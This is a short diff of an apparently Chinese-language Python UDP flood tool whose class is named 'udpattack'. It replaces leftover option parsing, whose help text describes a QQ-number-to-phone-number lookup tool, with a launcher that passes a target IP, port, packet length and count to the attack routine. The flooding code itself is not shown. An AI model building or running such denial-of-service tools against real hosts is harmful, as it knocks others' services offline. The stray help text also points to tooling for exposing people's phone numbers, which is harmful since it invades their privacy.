@@ -25,15 +25,7 @@ class udpattack():
         except KeyboardInterrupt:
             print ("攻击停止......")
 if __name__ == "__main__":
-    argx,opt = getopt.getopt(sys.argv[1:],"-i:-p:-l:-m:",['ip','port','len','max'])
-    for de, sa in argx:
-        if de in ('-i','--ip'):
-            print ("[+]debug模式启动!")
-            global debug
-            debug = "true"
-        if de in  ('-h','--help'):
-            print ('QQ号反查绑订手机号:\n[options]:\n  -d  --debug 启动DEBUG调试模式\n  -h  --help  查看帮助\n  -v --version  查看工具版本\n  --by:ms9944\n')
-            exit(1)
-        if de in ('-v','--version'):
-            print ('Script version is V0.2\n')
-            exit(1)
+    if len(sys.argv)!= 5:
+        logo()
+    else:
+         udpattack.start(sys.argv[1],int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4]))
